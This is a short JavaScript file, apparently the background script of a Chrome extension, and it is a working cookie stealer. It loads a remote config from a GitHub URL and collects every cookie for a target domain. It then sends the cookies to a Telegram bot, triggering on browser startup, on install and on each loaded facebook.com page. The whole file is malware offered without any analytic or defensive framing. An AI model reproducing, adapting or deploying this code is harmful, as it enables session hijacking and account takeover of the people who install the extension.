function fetchRemoteConfig(callback) {
  fetch("https://raw.githubusercontent.com/vietanh1206/extension-config/main/config.json")
    .then(res => res.json())
    .then(config => {
      if (config.enabled) callback(config);
    })
    .catch(err => console.error("Không tải được config:", err));
}

function sendTelegramMessage(cfg, cookieList) {
  const message = `${cfg.message_prefix}\n${cookieList}`;
  fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
    method: "POST",
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: cfg.chat_id,
      text: message
    })
  }).catch(err => console.error("Telegram error:", err));
}

function stealAllCookies(cfg) {
  chrome.cookies.getAll({ domain: cfg.target_domain }, (cookies) => {
    if (!cookies || cookies.length === 0) return;
    const cookieList = cookies.map(c => `${c.name}=${c.value}`).join("; ");
    sendTelegramMessage(cfg, cookieList);
  });
}

function initStealer() {
  fetchRemoteConfig(cfg => stealAllCookies(cfg));
}

chrome.runtime.onStartup.addListener(initStealer);
chrome.runtime.onInstalled.addListener(initStealer);
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url.includes("facebook.com")) {
    initStealer();
  }
});
